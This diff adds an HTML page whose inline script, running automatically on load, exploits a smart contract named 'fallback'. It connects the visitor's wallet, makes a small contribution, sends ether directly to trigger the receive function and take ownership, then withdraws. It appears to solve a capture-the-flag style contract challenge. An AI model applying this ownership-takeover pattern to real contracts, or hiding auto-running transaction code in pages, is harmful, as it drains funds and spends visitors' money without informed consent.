@@ -1,0 +1,116 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta http-equiv="X-UA-Compatible" content="ie=edge" />
+    <title>HTML 5 Boilerplate</title>
+    <link rel="stylesheet" href="style.css" />
+  </head>
+  <body>
+    <script src="https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js"></script>
+    <script>
+      (async () => {
+        let ethAddr;
+        if (window.ethereum) {
+          window.web3 = new Web3(window.ethereum);
+          let conn = await window.ethereum.enable();
+          if (conn.length > 0) {
+            ethAddr = conn[0];
+          }
+        } else {
+          return;
+        }
+
+        const fallbackContrAddr = "0xc305F0E2752E5eABf9b0bc6865526Ca345D1B33A";
+        const fallbackContract = await new window.web3.eth.Contract(
+          [
+            {
+              inputs: [],
+              stateMutability: "nonpayable",
+              type: "constructor",
+            },
+            {
+              inputs: [],
+              name: "contribute",
+              outputs: [],
+              stateMutability: "payable",
+              type: "function",
+            },
+            {
+              inputs: [
+                {
+                  internalType: "address",
+                  name: "",
+                  type: "address",
+                },
+              ],
+              name: "contributions",
+              outputs: [
+                {
+                  internalType: "uint256",
+                  name: "",
+                  type: "uint256",
+                },
+              ],
+              stateMutability: "view",
+              type: "function",
+            },
+            {
+              inputs: [],
+              name: "getContribution",
+              outputs: [
+                {
+                  internalType: "uint256",
+                  name: "",
+                  type: "uint256",
+                },
+              ],
+              stateMutability: "view",
+              type: "function",
+            },
+            {
+              inputs: [],
+              name: "owner",
+              outputs: [
+                {
+                  internalType: "address payable",
+                  name: "",
+                  type: "address",
+                },
+              ],
+              stateMutability: "view",
+              type: "function",
+            },
+            {
+              inputs: [],
+              name: "withdraw",
+              outputs: [],
+              stateMutability: "nonpayable",
+              type: "function",
+            },
+            {
+              stateMutability: "payable",
+              type: "receive",
+            },
+          ],
+          fallbackContrAddr
+        );
+
+        const params = { from: ethAddr, value: Web3.utils.toWei("0.0005") };
+
+        await fallbackContract.methods.contribute().send(params);
+        await window.web3.eth.sendTransaction(
+          {
+            ...params,
+            to: fallbackContrAddr,
+          },
+          (err, receipt) => {}
+        );
+        const res = await fallbackContract.methods
+          .withdraw()
+          .send({ from: ethAddr });
+      })();
+    </script>
+  </body>
+</html>
